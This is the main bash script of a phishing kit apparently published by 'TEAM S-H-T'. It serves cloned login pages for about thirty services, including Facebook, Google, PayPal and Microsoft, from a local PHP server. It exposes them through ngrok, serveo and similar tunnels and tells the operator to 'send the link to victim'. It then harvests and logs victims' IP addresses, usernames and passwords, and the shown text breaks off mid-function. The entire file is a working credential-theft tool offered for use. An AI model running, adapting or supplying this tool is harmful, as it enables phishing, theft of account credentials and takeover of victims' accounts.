#!/bin/bash

trap 'printf "\n";stop;exit 1' 2
trap user_interrupt SIGINT
trap user_interrupt SIGTSTP

user_interrupt(){
        printf "\e[0m\n"
        printf "\e[0m\e[1;36m\t CTRL + C Pressed !!\n"
        sleep 2
        printf "\e[0m\n"
        printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Saikohackerteamrm for more\e[0m\n"
        printf "\e[0m\n"
        exit 1
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

}

reqs() {

command -v php > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
command -v ssh > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }

if [[ -d .htr ]]; then
printf ""
else
printf "\n\e[0m\e[96m Packages are not Found ! type \e[0m\e[93mbash setup.sh\e[0m\n\n"
exit 1 
fi

if [[ -d .Modules ]]; then
printf ""
else
printf "\n\e[0m\e[96m Packages are not Found ! type \e[0m\e[93mbash setup\e[0m\n\n"
exit 1 
fi

if [[ -d .htr/www ]]; then
rm -rf .htr/www
mkdir .htr/www
else
mkdir .htr/www
fi

}

banner() {

clear
printf "\e[0m\n"
printf "\e[0m\e[92m    _____ ________   __ \e[0m\e[93m _____  _     _     _                \e[0m\n"
printf "\e[0m\e[92m   / ____|  ____\ \ / / \e[0m\e[93m|  __ \| |   (_)   | |               \e[0m\n"
printf "\e[0m\e[92m  | (___ | |__   \ V / \e[0m\e[93m | |__) | |__  _ ___| |__   ___ _ __  \e[0m\n"
printf "\e[0m\e[92m   \___ \|  __|   > <   \e[0m\e[93m|  ___/|  _ \| / __|  _ \ / _ \  __| \e[0m\n"
printf "\e[0m\e[92m   ____) | |____ / . \  \e[0m\e[93m| |    | | | | \__ \ | | |  __/ |    \e[0m\n"
printf "\e[0m\e[92m  |_____/|______/_/ \_\ \e[0m\e[93m|_|    |_| |_|_|___/_| |_|\___|_| \e[0m\e[1;44m[V 1.0]\e[0m\n"
printf "\e[0m\n"
printf " \e[0m\e[1;41m Advanced Phishing Tool with 30+ Templates  [BY : TEAM S-H-T]\e[0m\n"
printf "\e[0m\n"

}

smallbanner() {

clear
printf "\e[0m\n"
printf "\e[0m\e[93m   ______                        _____       __  __    ______    \e[0m\n"
printf "\e[0m\e[93m  /_  __/__  ____ _____ ___     / ___/      / / / /   /_  __/    \e[0m\n"
printf "\e[0m\e[93m   / / / _ \/ __ `/ __ `__ \    \__ \______/ /_/ /_____/ /      \e[0m\n"
printf "\e[0m\e[93m  / / /  __/ /_/ / / / / / /   ___/ /_____/ __  /_____/ /       \e[0m\n"
printf "\e[0m\e[93m /_/  \___/\__,_/_/ /_/ /_/   /____/     /_/ /_/     /_/         \e[0m\e[1;46m[V 1.0]\e[0m\n"
printf "\e[0m\n"
printf "    \e[0m\e[1;44m Advanced Phishing Tool with 30+ Templates\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[91m    [\e[0m\e[96m BY \e[0m\e[91m: \e[0m\e[96mhttps://github.com/Saikohackerteamrm \e[0m\e[91m] \e[0m\n"
printf "\e[0m\n"

}

menu() {

printf "      \e[0m\e[1;46m[::]  Select Any Attack for Your Victim  [::]\e[0m\n"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook    \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;93m Twitch      \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;93m DeviantArt	\e[0m\e[1;31m[\e[0m\e[1;77m99\e[0m\e[1;31m]\e[0m\e[1;93m About\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Instagram   \e[0m\e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;93m Pinterest   \e[0m\e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[1;93m Badoo		\e[0m\e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m]\e[0m\e[1;93m Exit\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Google      \e[0m\e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;93m Snapchat    \e[0m\e[1;31m[\e[0m\e[1;77m23\e[0m\e[1;31m]\e[0m\e[1;93m Origin\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Microsoft   \e[0m\e[1;31m[\e[0m\e[1;77m14\e[0m\e[1;31m]\e[0m\e[1;93m Linkedin    \e[0m\e[1;31m[\e[0m\e[1;77m24\e[0m\e[1;31m]\e[0m\e[1;93m CryptoCoin\e[0m\n"	
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Netflix     \e[0m\e[1;31m[\e[0m\e[1;77m15\e[0m\e[1;31m]\e[0m\e[1;93m Ebay        \e[0m\e[1;31m[\e[0m\e[1;77m25\e[0m\e[1;31m]\e[0m\e[1;93m Yahoo	\e[0m\n"	
printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Paypal      \e[0m\e[1;31m[\e[0m\e[1;77m16\e[0m\e[1;31m]\e[0m\e[1;93m Dropbox     \e[0m\e[1;31m[\e[0m\e[1;77m26\e[0m\e[1;31m]\e[0m\e[1;93m Wordpress\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Steam       \e[0m\e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[1;93m Protonmail  \e[0m\e[1;31m[\e[0m\e[1;77m27\e[0m\e[1;31m]\e[0m\e[1;93m Yandex	\e[0m\n"		
printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m Twitter     \e[0m\e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[1;93m Spotify     \e[0m\e[1;31m[\e[0m\e[1;77m28\e[0m\e[1;31m]\e[0m\e[1;93m StackoverFlow\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m Playstation \e[0m\e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;93m Reddit      \e[0m\e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;93m Vk\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Adobe       \e[0m\e[1;31m[\e[0m\e[1;77m30\e[0m\e[1;31m]\e[0m\e[1;93m XBOX\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' menu_option

if [[ $menu_option == 1 || $menu_option == 01 ]]; then
facebook
elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
instagram
elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
gmail
elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
website="microsoft"
tunnel_menu
elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
website="netflix"
tunnel_menu
elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
website="paypal"
tunnel_menu
elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
website="steam"
tunnel_menu
elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
website="twitter"
tunnel_menu
elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
website="playstation"
tunnel_menu
elif [[ $menu_option == 10 ]]; then
website="github"
tunnel_menu
elif [[ $menu_option == 11 ]]; then
website="twitch"
tunnel_menu
elif [[ $menu_option == 12 ]]; then
website="pinterest"
tunnel_menu
elif [[ $menu_option == 13 ]]; then
website="snapchat"
tunnel_menu
elif [[ $menu_option == 14 ]]; then
website="linkedin"
tunnel_menu
elif [[ $menu_option == 15 ]]; then
website="ebay"
tunnel_menu
elif [[ $menu_option == 16 ]]; then
website="dropbox"
tunnel_menu
elif [[ $menu_option == 17 ]]; then
website="protonmail"
tunnel_menu
elif [[ $menu_option == 18 ]]; then
website="spotify"
tunnel_menu
elif [[ $menu_option == 19 ]]; then
website="reddit"
tunnel_menu
elif [[ $menu_option == 20 ]]; then
website="adobe"
tunnel_menu
elif [[ $menu_option == 21 ]]; then
website="deviantart"
tunnel_menu
elif [[ $menu_option == 22 ]]; then
website="badoo"
tunnel_menu
elif [[ $menu_option == 23 ]]; then
website="origin"
tunnel_menu
elif [[ $menu_option == 24 ]]; then
website="cryptocoinsniper"
tunnel_menu
elif [[ $menu_option == 25 ]]; then
website="yahoo"
tunnel_menu
elif [[ $menu_option == 26 ]]; then
website="wordpress"
tunnel_menu
elif [[ $menu_option == 27 ]]; then
website="yandex"
tunnel_menu
elif [[ $menu_option == 28 ]]; then
website="stackoverflow"
tunnel_menu
elif [[ $menu_option == 29 ]]; then
vk
elif [[ $menu_option == 30 ]]; then
website="xbox"
tunnel_menu
elif [[ $menu_option == 99 ]]; then
about
elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Saikohackerteamrm for more\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

facebook(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option


if [[ $fb_option == 1 || $fb_option == 01 ]]; then
website="facebook"
tunnel_menu
elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
website="fb_advanced"
tunnel_menu
elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
website="fb_security"
tunnel_menu
elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
website="fb_messenger"
tunnel_menu

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
instagram(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' ig_option


if [[ $ig_option == 1 || $ig_option == 01 ]]; then
website="instagram"
tunnel_menu
elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
website="ig_followers"
tunnel_menu
elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
website="ig_verify"
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
gmail(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Gmail Old Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Gmail New Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' gmail_option


if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
website="google"
tunnel_menu
elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
website="google_new"
tunnel_menu
elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
website="google_poll"
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
vk(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' vk_option


if [[ $vk_option == 1 || $vk_option == 01 ]]; then
website="vk"
tunnel_menu
elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
website="vk_poll"
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

about() {

clear
sleep 2
printf "\e[0m\n"
printf "\e[0m\e[93m _____________   __  ___  ____    __ __   ______   \e[0m\n"
printf "\e[0m\e[93m /_  __/ __/ _ | /  |/  / / __/___/ // /__/_  __/   \e[0m\n"
printf "\e[0m\e[93m / / / _// __ |/ /|_/ / _\ \/___/ _  /___// /     \e[0m\n"
printf "\e[0m\e[93m /_/ /___/_/ |_/_/  /_/ /___/   /_//_/    /_/       \e[0m\e[1;46m[V 1.0]\e[0m\n"
printf "\e[0m\n"
printf "    \e[0m\e[1;44m Advanced Phishing Tool with 30+ Templates\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m RM Rony Ali\e[0m\e[91m[\e[0m\e[93m TEAM S-H-T\e[0m\e[91m]\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/Saikohackerteamrm\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  Instagram \e[0m\e[91m  : \e[0m\e[96mhttps://instagr.am/saikohackerteamrm\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  Version \e[0m\e[91m    : \e[0m\e[93m1.0\e[0m\n"
printf "\e[0m\n"
printf "         \e[0m\e[1;44m Follow Our Github For More Tools \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
sleep 3
printf " \e[0m\e[91m[\e[0m00\e[0m\e[91m]\e[0m\e[93m Home           \e[0m\e[91m[\e[0m99\e[0m\e[91m]\e[0m\e[93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' about_option

if [[ $about_option == 0 || $about_option == 00 ]]; then
sleep 1
banner
menu
elif [[ $about_option == 99 ]]; then
sleep 1
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Saikohackerteamrm for more\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

tunnel_menu() {

if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

if [[ -d .htr/www ]]; then
rm -rf .htr/www
mkdir .htr/www
else
mkdir .htr/www
fi

cp -rf .Modules/$website/* .htr/www
cp -f .Modules/ip.php .htr/www/

def_tunnel_menu="2"
smallbanner
printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost\e[0m\n"
printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Ngrok\e[0m\n"
printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m Serveo \e[0m\e[91m[\e[0m\e[93mCurrently Down\e[0m\e[91m]\e[0m\n"
printf "\e[0m\e[91m [\e[0m04\e[0m\e[91m]\e[0m\e[93m LocalXpose\e[0m\n"
printf "\e[0m\e[91m [\e[0m05\e[0m\e[91m]\e[0m\e[93m LocalHostRun\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' tunnel_menu
tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"

if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
start_localhost
elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
start_ngrok
elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
start_serveo
elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
start_loclx
elif [[ $tunnel_menu == 5 || $tunnel_menu == 05 ]]; then
start_localhostrun

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

start_localhost() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://127.0.0.1:5555\e[0m\n"

datafound

}

start_ngrok() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 7
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")

smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $ngrok_link

datafound
}

start_serveo() {

serveo_default_choose_sub="Y"
serveo_default_sub="$website$RANDOM"
serveo_def_port="5555"

printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;96m %s \e[0m\e[1;91m )\e[0m\e[1;92m : \e[0m\e[1;93m' $serveo_def_port
read serveo_port
serveo_port="${serveo_port:-${serveo_def_port}}"
sleep 1
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
read serveo_choose_sub
serveo_choose_sub="${serveo_choose_sub:-${serveo_default_choose_sub}}"
if [[ $serveo_choose_sub == "Y" || $serveo_choose_sub == "y" || $serveo_choose_sub == "Yes" || $serveo_choose_sub == "yes" ]]; then
serveo_custom_subdomain=true
sleep 1
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;93m %s \e[0m\e[1;91m)\e[0m\e[1;92m: \e[0m\e[1;93m' $serveo_default_sub
read serveo_subdomain
serveo_subdomain="${serveo_subdomain:-${serveo_default_sub}}"
sleep 1
fi

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:$serveo_port\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:$serveo_port > /dev/null 2>&1 & 
if [[ $serveo_custom_subdomain == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_subdomain,$serveo_port
sleep 7

else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_port
sleep 7
fi
serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' .nexlink)
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $serveo_link

datafound
}

start_loclx() {

loclx_default_choose_sub="Y"
loclx_default_sub="$website$RANDOM"

printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
read loclx_choose_sub
loclx_choose_sub="${loclx_choose_sub:-${loclx_default_choose_sub}}"
if [[ $loclx_choose_sub == "Y" || $loclx_choose_sub == "y" || $loclx_choose_sub == "Yes" || $loclx_choose_sub == "yes" ]]; then
loclx_custom_subdomain=true
sleep 1
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;93m %s \e[0m\e[1;91m )\e[0m\e[1;92m: \e[0m\e[1;93m' $loclx_default_sub
read loclx_subdomain
loclx_subdomain="${loclx_subdomain:-${loclx_default_sub}}"
sleep 1
fi

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4142\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalTunnel ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:4142 > /dev/null 2>&1 & 
if [[ $loclx_custom_subdomain == true ]]; then

./.htr/loclx tunnel http --to :4142 --subdomain $loclx_subdomain > .nexlink 2> /dev/null &

sleep 8

else
./.htr/loclx tunnel http --to :4142 > .nexlink 2> /dev/null &
sleep 8
fi
loclx_link=$(grep -o 'https://[0-9a-z]*\.loclx.io ' .nexlink)
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $loclx_link

datafound
}

start_localhostrun() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Press Ctrl+C to View Login Creds \e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m"
ssh -R 80:localhost:4545 ssh.localhost.run

printf "\e[0m\n"

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[1;93m Login Info \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\n"
printf "\e[0m\n"
while [ true ]; do


if [[ -e ".htr/www/ip.txt" ]]; then
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
grab_ip
rm -rf .htr/www/ip.txt
fi
sleep 0.75
if [[ -e ".htr/www/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat .htr/www/usernames.txt >> logs/$website.log
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to Exit\e[0m\n"
rm -rf .htr/www/usernames.txt
fi
sleep 0.75

done

}

grab_ip() {

ip=$(grep -a 'IP:' .htr/www/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ip.txt\e[0m\n" $server
printf "\n"
cat .htr/www/ip.txt >> ip.txt

}

grab_creds() {

account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat .htr/www/usernames.txt >> logs/$website.log
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
printf "\n"
